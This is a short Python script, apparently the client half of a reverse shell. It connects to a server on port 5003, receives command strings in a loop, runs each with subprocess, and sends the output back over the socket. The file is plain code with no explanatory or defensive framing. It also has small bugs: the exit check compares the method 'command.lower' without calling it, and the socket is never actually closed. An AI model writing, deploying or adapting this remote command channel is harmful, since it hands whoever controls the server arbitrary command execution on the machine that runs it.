import socket, sys
import subprocess
from subprocess import check_output

SERVER_HOST = socket.gethostname()
SERVER_PORT = 5003
#HOSTNAME = socket.gethostname()
BUFFER_SIZE = 4096

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

message = s.recv(BUFFER_SIZE).decode()
print('Server: ', message)

while True:
    command = s.recv(BUFFER_SIZE).decode()
    
    if command.lower == 'exit':
        break
    
    if command.split(' ').__len__() == 1:
        try:
            output = check_output([str(command)]).decode('CP866')
            s.send(output.encode())
        except FileNotFoundError:
            output = b'Error: FileNotFoundError'.decode('CP866')
            s.send(output.encode())
    else:
        try:
            output = check_output(command.split(' ')).decode('CP866')
            s.send(output.encode())
        except FileNotFoundError:
            output = b'Error: FileNotFoundError'.decode('CP866')
            s.send(output.encode())
    
    #output = subprocess.getoutput(command)
    #s.send(output.encode())

s.close
